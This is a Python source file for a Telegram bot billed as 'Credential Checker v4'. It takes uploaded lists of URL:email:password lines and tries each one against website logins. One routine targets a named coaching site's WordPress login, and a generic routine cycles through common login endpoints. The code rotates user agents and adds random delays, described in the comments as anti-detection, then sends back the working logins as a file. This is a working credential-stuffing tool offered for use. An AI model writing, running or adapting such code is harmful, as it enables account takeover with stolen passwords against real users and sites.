import os
import sys
import logging
import threading
import aiohttp
import asyncio
import re
import json
import random
from datetime import datetime
from urllib.parse import urljoin, urlparse

# Fix for Pyrogram
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import Message
from config import API_ID, API_HASH, BOT_TOKEN, ADMINS

# --- Configuration ---
ALLOWED_USERS = []
if ADMINS:
    ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

def is_admin(user_id):
    return user_id in ALLOWED_USERS if ALLOWED_USERS else False

# --- Flask ---
flask_app = Flask(__name__)

@flask_app.route("/")
def health_check():
    return "Bot running", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)

# --- Clean URL ---
def clean_url(url):
    """Fix double https/http issues"""
    url = url.strip()
    # Remove duplicate protocols
    url = re.sub(r'^https://https://', 'https://', url)
    url = re.sub(r'^https://http://', 'http://', url)
    url = re.sub(r'^http://https://', 'https://', url)
    url = re.sub(r'^http://http://', 'http://', url)
    # Ensure protocol
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url

# --- Parse Credentials ---
def parse_credential_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    parts = line.split(':')
    if len(parts) < 3:
        return None
    
    url = clean_url(parts[0])
    password = ':'.join(parts[2:])
    username = ':'.join(parts[1:-1])
    
    return (url, username, password)

# --- Rotating User Agents ---
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.0',
]

# --- Check Mitesh Khatri Site ---
async def check_mitesh_khatri(session, email, password):
    """Direct login check for WordPress sites"""
    
    login_url = "https://coaching.miteshkhatri.com/login"
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://coaching.miteshkhatri.com',
        'Referer': 'https://coaching.miteshkhatri.com/login',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Cache-Control': 'max-age=0',
    }
    
    # WordPress standard login payload
    payload = {
        'log': email,
        'pwd': password,
        'rememberme': 'forever',
        'wp-submit': 'Log In',
        'redirect_to': 'https://coaching.miteshkhatri.com/wp-admin/',
        'testcookie': '1'
    }
    
    try:
        # First GET to get cookies
        async with session.get(login_url, headers=headers, timeout=15, ssl=False) as get_resp:
            # Get any cookies set
            pass
        
        # Wait a bit like human
        await asyncio.sleep(random.uniform(1, 2))
        
        # POST login
        async with session.post(
            login_url,
            data=payload,
            headers=headers,
            allow_redirects=True,
            timeout=20,
            ssl=False
        ) as response:
            
            final_url = str(response.url)
            text = await response.text()
            text_lower = text.lower()
            
            # Get cookies as dict
            cookies = {}
            for cookie in session.cookie_jar:
                cookies[cookie.key] = cookie.value
            
            debug_info = {
                'status': response.status,
                'final_url': final_url,
                'cookies': list(cookies.keys()),
                'has_wp_logged_in': any('wordpress_logged_in' in k for k in cookies),
                'content_snippet': text[:300].replace('\n', ' ')
            }
            
            # === STRONG SUCCESS CHECKS ===
            
            # 1. WordPress logged_in cookie = GUARANTEED SUCCESS
            if any('wordpress_logged_in' in k for k in cookies):
                return (True, {**debug_info, 'reason': 'WordPress logged_in cookie'})
            
            # 2. Redirected to wp-admin (not wp-login)
            if '/wp-admin' in final_url and 'wp-login' not in final_url:
                return (True, {**debug_info, 'reason': 'Redirected to wp-admin'})
            
            # 3. Dashboard page content
            dashboard_indicators = ['dashboard', 'wp-admin', 'profile', 'howdy', 'welcome to wordpress']
            if any(x in text_lower for x in dashboard_indicators):
                if 'error' not in text_lower and 'incorrect' not in text_lower:
                    return (True, {**debug_info, 'reason': 'Dashboard content detected'})
            
            # === FAILURE CHECKS ===
            
            failure_indicators = [
                'incorrect password' in text_lower,
                'invalid username' in text_lower,
                'invalid email' in text_lower,
                'unknown' in text_lower and 'email' in text_lower,
                'login failed' in text_lower,
                'the password you entered' in text_lower,
                'is incorrect' in text_lower,
                'error' in text_lower and 'login' in text_lower,
                'shake' in text_lower,  # WordPress error animation
                response.status == 403,
                'wp-login.php' in final_url and 'redirect_to' not in final_url,
            ]
            
            if any(failure_indicators):
                return (False, {**debug_info, 'reason': 'Login failed indicators'})
            
            # Ambiguous
            return (False, {**debug_info, 'reason': 'Could not determine - ambiguous'})
            
    except Exception as e:
        return (False, {'error': str(e), 'traceback': str(e)[:100]})

# --- Generic Site Checker ---
async def check_generic_site(session, url, username, password):
    """Generic checker for other sites"""
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }
    
    # Common login endpoints
    endpoints = [
        url,
        url.rstrip('/') + '/login',
        url.rstrip('/') + '/wp-login.php',
        url.rstrip('/') + '/auth/login',
    ]
    
    payloads = [
        {'log': username, 'pwd': password, 'wp-submit': 'Log In'},
        {'email': username, 'password': password},
        {'username': username, 'password': password},
    ]
    
    for endpoint in endpoints:
        for payload in payloads:
            try:
                async with session.post(
                    endpoint, data=payload, headers=headers,
                    allow_redirects=True, timeout=15, ssl=False
                ) as resp:
                    
                    text = await resp.text()
                    text_lower = text.lower()
                    cookies = str(resp.cookies)
                    
                    # Success
                    if 'wordpress_logged_in' in cookies:
                        return (True, {'method': 'generic', 'endpoint': endpoint})
                    
                    # Failure
                    if any(x in text_lower for x in ['incorrect', 'invalid', 'error']):
                        return (False, {'reason': 'Error in response'})
                        
            except Exception:
                continue
    
    return (False, 'All attempts failed')

# --- Main Router ---
async def check_credential(session, url, username, password):
    """Route to appropriate checker"""
    
    url_lower = url.lower()
    
    # Site-specific
    if 'miteshkhatri.com' in url_lower:
        return await check_mitesh_khatri(session, username, password)
    
    # Generic
    return await check_generic_site(session, url, username, password)

# --- Process File ---
async def process_credentials(client: Client, message: Message, file_path: str):
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
        return
    
    credentials = []
    for line_num, line in enumerate(lines, 1):
        parsed = parse_credential_line(line)
        if parsed:
            credentials.append((line_num, *parsed))
    
    total = len(credentials)
    if total == 0:
        await message.reply_text("❌ No valid credentials found")
        return
    
    await message.reply_text(f"🔍 Found {total} credentials to check...")
    
    valid_results = []
    invalid_results = []
    checked = 0
    
    # Create session with cookie persistence
    timeout = aiohttp.ClientTimeout(total=25)
    
    async with aiohttp.ClientSession(timeout=timeout) as session:
        
        for line_num, url, username, password in credentials:
            
            is_valid, debug_info = await check_credential(session, url, username, password)
            
            log_entry = f"{url}:{username}:{password}"
            
            if is_valid:
                valid_results.append(log_entry)
                logger.info(f"✅ VALID: {username}")
            else:
                debug_str = json.dumps(debug_info, default=str)[:150]
                invalid_results.append(f"{log_entry} | {debug_str}")
                logger.info(f"❌ INVALID: {username}")
            
            checked += 1
            
            # Progress every 3 checks
            if checked % 3 == 0 or checked == total:
                await message.reply_text(
                    f"⏳ {checked}/{total} ({int(checked/total*100)}%)\n"
                    f"✅ {len(valid_results)} | ❌ {len(invalid_results)}"
                )
            
            # Random delay to avoid detection
            await asyncio.sleep(random.uniform(2, 4))
    
    # Results
    summary = f"✅ Done!\n\n📊 Total: {total}\n✅ Valid: {len(valid_results)}\n❌ Invalid: {len(invalid_results)}"
    await message.reply_text(summary)
    
    # Valid file
    if valid_results:
        fname = f"VALID_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(fname, 'w') as f:
            f.write('\n'.join(valid_results))
        await message.reply_document(fname, caption=f"✅ {len(valid_results)} Valid")
        os.remove(fname)
    
    # Debug file
    if invalid_results:
        fname = f"DEBUG_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(fname, 'w') as f:
            f.write('\n'.join(invalid_results[:20]))
        await message.reply_document(fname, caption="🐛 Debug (first 20)")
        os.remove(fname)
    
    os.remove(file_path)

# --- Bot ---
app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command("start"))
async def start(client, message: Message):
    if not is_admin(message.from_user.id):
        return
    await message.reply_text(
        "👨‍💻 **Credential Checker v4**\n\n"
        "✅ Fixed URL parsing (no more double https)\n"
        "✅ Better anti-detection\n"
        "✅ WordPress specific checks\n\n"
        "Format: `URL:email:password`"
    )

@app.on_message(filters.document)
async def handle_doc(client, message: Message):
    if not is_admin(message.from_user.id):
        return
    
    if not message.document.file_name.endswith('.txt'):
        await message.reply_text("❌ Send .txt file")
        return
    
    try:
        file_path = await message.download()
    except Exception as e:
        await message.reply_text(f"❌ Download failed: {e}")
        return
    
    await message.reply_text("📥 Checking credentials...")
    await process_credentials(client, message, file_path)

@app.on_message(filters.private & ~filters.document & ~filters.command("start"))
async def private_msg(client, message: Message):
    if not is_admin(message.from_user.id):
        return
    await message.reply_text("Send .txt file")

# --- Run ---
if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    logger.info("Bot starting...")
    app.run()
